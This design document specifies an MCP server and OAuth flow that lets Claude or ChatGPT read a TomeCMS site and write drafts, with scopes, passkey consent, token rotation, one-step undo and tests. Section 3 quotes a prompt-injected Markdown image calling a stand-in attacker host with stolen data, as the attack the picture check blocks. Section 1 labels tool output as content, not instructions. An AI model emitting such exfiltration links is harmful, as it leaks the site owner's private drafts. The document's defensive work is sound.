# MCP: letting an AI app read the site and write drafts

Date: 2026-10-01
Status: Design, approved section by section by the owner; for review before planning

The owner can connect Claude (claude.ai, Desktop, mobile, Claude Code) or ChatGPT to their own site.
The AI can then read every post and page, drafts included, create drafts and edit drafts. It cannot
publish, schedule, delete, upload, or change anything else. The owner signs it in with their passkey
through OAuth, sees every connection on the Plugins screen, and can cut any of them off at once.

Background: `docs/research/2026-09-29-mcp-server.md` (the study, its sources and its security notes).

## What was decided before this was written

The owner decided each of these.

- **Reading and writing in one release.** It is not built read-only first.
- **OAuth, for Claude and ChatGPT.** Both connect with OAuth 2.1, PKCE (S256), the `resource`
  parameter, and a client identified by a Client ID Metadata Document (CIMD) or Dynamic Client
  Registration (DCR). One authorization server serves both.
  - Sources checked 2026-10-01:
    [Claude](https://claude.com/docs/connectors/building/authentication) and
    [OpenAI](https://developers.openai.com/plugins/build/auth).
- **It looks like a plugin, and its code lives in the core.**
  - What the owner sees: a card on the Plugins screen with a switch, settings and an "Official"
    badge. `npm run plugin:disable mcp` switches it off.
  - Where the code lives: in the core. The plugin contract still forbids routes, database access and
    writes to a plugin (`src/plugins/contract.ts`), and that does not change.
- **Drafts only.** The AI creates and edits drafts. It cannot edit a published post, publish,
  schedule, or delete. TomeCMS has no trash and no history, so a delete is permanent.
- **Every draft is editable, with one step of undo.** The AI may edit any draft, including one the
  owner wrote. The owner can put back what the draft was before the AI touched it.
- **Posts and pages.** Categories and the media library can be read and not changed. The AI places a
  picture that is already in the library, and cannot upload one.
- **Approach A:** a narrow OAuth authorization server built into the app, with its own tables.
  Rejected:
  - `@better-auth/oauth-provider`: it means a better-auth upgrade and tables outside our migrations,
    which risks locking the owner out of sign-in;
  - an external identity provider: one more container, against the updater's compose contract.

## 1. The tools

Two scopes: `content:read` and `drafts:write`. The tool list a client sees depends on the scopes its
token holds. A token without `drafts:write` sees no write tool at all.

| Tool | Scope | Does |
|---|---|---|
| `get_site` | read | Site name, languages, time zone, public URL |
| `search_content` | read | Words in posts and pages, filtered by language and by status (`published`, `draft`, `any`). The same matching as public search (1.2.0). |
| `list_posts`, `list_pages` | read | With a cursor. Each item: id, title, slug, language, status, dates, and its other-language edition |
| `get_post`, `get_page` | read | By id, or by language and slug. Returns the metadata, the body as Markdown (section 3), the block list, `formattingNotShown` and `updatedAt`. A body over 60,000 characters comes in parts, through `offset`. |
| `list_categories` | read | The site's categories |
| `list_media` | read | Pictures in the library, with a search and a cursor: id, name, alt text, size, `/media/<id>` |
| `create_draft` | write | A new post or page as a draft. Takes the body as Markdown, title, slug, excerpt, meta title and description, categories by name (only ones that exist, as in the Markdown import), and a cover from the library. `translationOf: <id>` makes it the other-language edition of that post or page. |
| `update_draft` | write | Changes any of those fields on a draft. Requires `updatedAt`: an edit made since the AI read the draft gives 409, and nothing is overwritten. Keeps the undo copy first (section 3). Refused for anything that is not a draft. |

**Left out:** publishing, scheduling, unpublishing, deleting, uploading media, writing categories,
menus, redirects, slides, settings, plugins, security and updates.

Every tool's input is checked with zod at the same limits the admin has: title 200 characters, excerpt
120, meta title 70, meta description 320, the slug pattern, at most 20 categories, and a body of at
most 900 KB. Read tools carry `readOnlyHint: true`, `idempotentHint: true` and
`openWorldHint: false`. `update_draft` carries `destructiveHint: true`, because it replaces a body.

**Tool output:**
- Content comes back as data, labelled as the site's content and not as instructions to follow.
- No tool returns a secret, a plugin setting, a token or a passkey.

**Errors:**
- A refusal is an MCP tool error with a sentence the AI can act on. For example, a picture that is
  not in the library is answered with "use list_media".
- A server fault is a plain error with the request id. Content is never written to the log.

## 2. OAuth and the consent screen

### Endpoints

All of these are on the site's own origin, behind the existing Caddy rule. While the plugin is off,
every one of them answers 404.

| Path | Does |
|---|---|
| `/mcp` | Streamable HTTP, stateless, JSON responses (`@modelcontextprotocol/server`, pinned exactly). Without a valid token it answers `401` with `WWW-Authenticate: Bearer resource_metadata="<origin>/.well-known/oauth-protected-resource"`. Claude starts sign-in only on a 401. |
| `/.well-known/oauth-protected-resource`, and the same with `/mcp` appended | `resource: <origin>/mcp`, `authorization_servers: [<origin>]`, `scopes_supported` |
| `/.well-known/oauth-authorization-server` | See the list below this table. |
| `/oauth/register` | DCR, JSON |
| `/oauth/authorize` | The consent screen (GET), and approve or deny (POST) |
| `/oauth/token` | `authorization_code` and `refresh_token`, `application/x-www-form-urlencoded` |

The authorization server metadata advertises:
- `issuer`, `authorization_endpoint`, `token_endpoint` and `registration_endpoint`;
- `response_types_supported: ["code"]`;
- `grant_types_supported: ["authorization_code", "refresh_token"]`;
- `code_challenge_methods_supported: ["S256"]`;
- `token_endpoint_auth_methods_supported: ["none"]`;
- `client_id_metadata_document_supported: true`;
- `authorization_response_iss_parameter_supported: true`, so ChatGPT uses its stable callback;
- `scopes_supported`.

### Clients

- **CIMD.** A `client_id` that is an `https` URL is fetched and checked:
  - `https` only;
  - the host is resolved and refused if any address is private, loopback, link-local or otherwise
    not public;
  - no redirects;
  - 5-second timeout and at most 64 KB of JSON;
  - the document's `client_id` must equal the URL;
  - it is cached for 24 hours.

  This fetcher is the only outbound request the feature makes.
- **DCR.** `/oauth/register` takes `{ client_name, redirect_uris }`. Rules:
  - public clients only;
  - rate-limited per sender (`senderAddress`);
  - a client never approved is deleted after 24 hours;
  - at most 100 clients.
- **Redirect URIs are allowed only from a list.** It holds:
  - `https://claude.ai/api/mcp/auth_callback`;
  - `https://chatgpt.com/connector_platform_oauth_redirect`;
  - `http://localhost` and `http://127.0.0.1` on any port and any path (loopback, as Claude Code
    uses: the port is ignored when matching);
  - any URI the owner adds in the plugin's settings.

  A client, by DCR or CIMD, whose redirect URIs fall outside this list is refused. An exact match is
  required except for the loopback port.

### Connecting

1. The owner pastes `https://<site>/mcp` into Claude's or ChatGPT's connector screen.
2. The client calls `/mcp`, gets 401, reads the metadata, and identifies itself by CIMD or DCR.
3. The browser opens `/oauth/authorize`.
   - **Before anything is shown,** each of these is checked: the client, `redirect_uri` against the
     client and the allowed list, `response_type=code`, PKCE with S256, and `resource` (when given)
     equal to `<origin>/mcp`.
   - **On a bad request,** an error page is shown and nothing is redirected.
   - **If the owner is not signed in,** the request goes to the admin's passkey sign-in and comes back.
4. **The consent screen**, in the admin's look and in the owner's language, shows:
   - the client's name;
   - **the host the code will be sent to**, in large type;
   - a warning when the client's only redirects are loopback addresses ("a program on this
     computer");
   - the scopes as checkboxes: reading, always on; writing drafts, ticked when requested, and absent
     while "Allow AI to write drafts" is off.
5. **Allow** needs a passkey session younger than 5 minutes (`requireFreshOwnerSession`), so the owner
   confirms with their passkey again, as for installing an update. The POST goes through
   `assertSameOrigin`.
   - **Deny** redirects back with `error=access_denied`.
6. An authorization code is issued. It is 32 random bytes, of which only the SHA-256 is stored. It is
   single use, lasts 60 seconds, and is bound to the client, the redirect URI, the PKCE challenge, the
   scopes and the resource. The browser is redirected with `code`, `state` and `iss`.
7. `/oauth/token` checks the code, the redirect URI and `code_verifier`, then issues the tokens below.

### Tokens and connections

- **One approval is one connection.** It records the client, its name, the redirect host, the
  scopes, when it was created, when it was last used, and whether it was revoked.
- **Access token:**
  - opaque, 32 random bytes, of which only the SHA-256 is stored;
  - lasts 1 hour;
  - bound to the connection, its scopes and the resource `<origin>/mcp`.

  Every `/mcp` call looks the token up, which costs one query.
- **Refresh token:**
  - opaque, lasts 30 days, rotated on every use, and the new one is returned in the same response;
  - **a rotated refresh token used again revokes the whole connection,** taken as theft.
- **Token endpoint errors** follow RFC 6749 (`invalid_grant`, `invalid_client`, `invalid_request`,
  `unsupported_grant_type`). Responses carry `Cache-Control: no-store`. The endpoint is rate-limited
  per sender.
- **Two separate worlds:**
  - `/mcp` accepts only a bearer token and never a cookie;
  - an MCP token is never accepted on `/api/admin/*`;
  - the consent screen uses the ordinary cookie session.
- **Maintenance (site closed):** `/mcp` and OAuth keep working, because the caller is the owner.
- **During an update:** every write tool answers "an update is running, try again". The check is
  `isUpdateWriteBlocked()`, because the existing freeze covers only `/api/admin`. Reading goes on.

## 3. Markdown both ways, and one step of undo

### Reading: document to Markdown

The document is turned into Markdown with `@tiptap/markdown`, using the server's own extensions
(`extensions` from `src/server/content/editor.ts`).

1. **Marks Markdown cannot carry** are removed first and counted: text colour, underline and
   alignment. Underline would otherwise come out as `++x++`. The tool returns
   `formattingNotShown: { color, underline, align }`.
2. **Blocks Markdown cannot carry** become a line `{{tome:block N}}`, numbered in document order:
   - videos;
   - file attachments;
   - tables with a merged cell.

   The tool also returns a short list such as `block 1: video "Clip title"`.
3. **A picture from the library** is `![alt](/media/<id>)` and comes back unchanged.

### Writing: Markdown to document

1. The Markdown goes through `readMarkdownPost`, the 1.6.0 import's reader. It runs in a worker with
   time and memory limits, takes at most 900 KB, and removes HTML. Frontmatter in the body is ignored;
   fields come from the tool's parameters.
2. **Putting blocks back:** a paragraph whose whole text is `{{tome:block N}}` is replaced by block
   `N` of the stored draft.
   - This is exact, because `update_draft` only writes against the `updatedAt` the AI read, so the
     numbering is the same.
   - An unknown `N` refuses the call.
   - In `create_draft`, any `{{tome:block …}}` refuses the call.
3. **Pictures:** only `/media/<uuid>` of this owner is accepted. Any other picture refuses the whole
   call, naming the offending addresses, so the AI fixes it and calls again.
   - This blocks a prompt-injected `![](https://attacker/?data=…)`, which the owner's browser would
     load on opening the draft. Ownership is checked by the existing `assertContentMedia`.
4. **The response** carries the new `updatedAt`, the warnings (for example "HTML removed (2
   places)"), and, when a body was sent, `formattingLost` with the counts from reading.
5. **A call without `body`** changes only the fields it names and leaves the body untouched.

### Undo: one step

- **The table:** a new `content_ai_snapshots`, with at most one row per post or page, keyed by kind
  and id and cascading on delete. A row holds:
  - every field the AI can change: title, slug, excerpt, meta title and description, cover,
    category ids, `content_json` and `content_html`;
  - `ai_written_at` and the connection that wrote.
- **Which version is kept:** "what the draft was before the AI started".
  - Before an AI write, the current draft is copied into the snapshot unless a snapshot exists and
    the draft's `updated_at` still equals that snapshot's `ai_written_at`. In that case the AI is
    writing again with nobody in between, and the older snapshot is kept.
  - After the write, `ai_written_at` is set to the draft's new `updated_at`.
- **In the editor**, while a snapshot exists, a bar reads "AI (<client>) changed this draft at 14:32 ·
  Put back".
  - **Put back** writes the snapshot through `updatePost` or `updatePage`, with the usual `updatedAt`
    check, and deletes the snapshot.
  - If the owner has edited since the AI did (`updated_at` > `ai_written_at`), Put back first
    confirms that those edits will be lost too.
- **The snapshot is deleted** when the owner puts it back, when the post or page is published, and
  when it is deleted.
- **Logging:** every MCP write is logged with the tool, the connection id, the content id and the
  request id. Content is not logged. Nothing marks a draft as "made by AI" beyond the undo bar.

## 4. The plugin card and connections

- **The card.** A manifest `mcp` joins `PLUGIN_MANIFESTS`, with a new hook id `mcp` in the closed
  set, whose words the core supplies, and the Official badge.
  - Its implementation is the core's routes. `tests/unit/plugin-admin.test.ts` learns that `mcp` is
    satisfied by the core.
- **Settings**, using existing kinds:

  | Setting | Kind | Default |
  |---|---|---|
  | Allow AI to write drafts | switch | on |
  | More redirect URIs | text, comma-separated, each `https` or loopback | empty |

  "Allow AI to write drafts" is checked on every call, not baked into a token. Switching it off stops
  writing at once, without revoking anything.
- **Below the card while it is on,** the core shows:
  - the connection URL with a copy button;
  - links to the docs for connecting Claude and ChatGPT;
  - the connections list: client, redirect host, scopes, connected, last used, and **Revoke**, which
    takes effect at once.
- **Kill switch:**
  - Off, from the admin or `npm run plugin:disable mcp`, makes every MCP and OAuth endpoint answer 404
    at once.
  - **Switching it on again clears every earlier connection, client and token.** The rule lives on
    switching on rather than off because `plugin-disable` writes the row directly and runs no app
    code. While it is off, nothing can use a token anyway.

## 5. Tests

- **Unit:**
  - Markdown out: marks removed and counted, block lines, library pictures.
  - Markdown in: blocks put back, unknown block, a block line in `create_draft`, an outside picture
    refused.
  - The snapshot rule.
  - Redirect matching, including loopback on any port.
  - The CIMD fetcher, against a stubbed resolver and fetch: `http`, private and loopback addresses,
    a redirect, a timeout, an oversized document, and a `client_id` mismatch.
  - PKCE verification.
  - Refresh rotation, and revocation on reuse.
  - The tool list by scope.
- **Integration**, on Postgres:
  - The OAuth round trip (register, authorize with a fresh session, token, refresh, reuse).
  - An MCP token refused on `/api/admin/*`, and a cookie refused on `/mcp`.
  - Every tool through the handler's `fetch`.
  - `update_draft` 409 on a stale `updatedAt`, and refused on a published post.
  - Put back.
  - Writes refused during an update.
  - Write refused with "Allow AI to write drafts" off.
  - Switching on again clears connections.
  - 404 everywhere while off.
- **Browser:** switch the plugin on, then:
  1. a test client connects and the consent screen asks for the passkey (the existing virtual
     authenticator);
  2. tool calls create and edit a draft;
  3. the editor shows the undo bar and Put back works;
  4. Revoke on the card cuts the client off.

  Run at 390 px and 1440 px.
- **On the real server:** connect daedalus from claude.ai and from ChatGPT. Neither can reach a local
  install, because both call a public `https` URL. The results go into the release notes.

## Dependencies and migrations

- **New dependency:** `@modelcontextprotocol/server`, pinned exactly (2.2.0 on 2026-10-01, MIT). It
  brings `@modelcontextprotocol/core`; `zod` is already in the project.
- **One migration**, with these tables:
  - `mcp_clients`: DCR clients and cached CIMD documents;
  - `mcp_connections`;
  - `mcp_tokens`: access and refresh token hashes, kind, expiry and the rotated-from link;
  - `mcp_codes`;
  - `content_ai_snapshots`.

  Rate-limit actions for `oauth-register` and `oauth-token` are added to the CHECK constraint, as
  `008_update_rate_limit_actions.ts` did. `reset-tables.ts` and the migration inventory learn the new
  tables.
- **Docs:** English and Thai. A page under Extending or Admin covers:
  - what the AI can and cannot see and do;
  - connecting Claude, step by step;
  - connecting ChatGPT, step by step;
  - Claude Code (`claude mcp add --transport http <site>/mcp`);
  - revoking a connection and switching it off;
  - privacy: what a tool returns goes to that AI provider.

## Left for later

- Publishing or scheduling through MCP. If it is ever wanted, it gets its own scope, opted into on
  consent, and a fresh passkey.
- Uploading media; the server fetching a picture from a URL.
- Writing categories, menus or settings.
- More than one step of undo, or a full revision history.
- Prompts and resources (MCP primitives); only tools are offered.
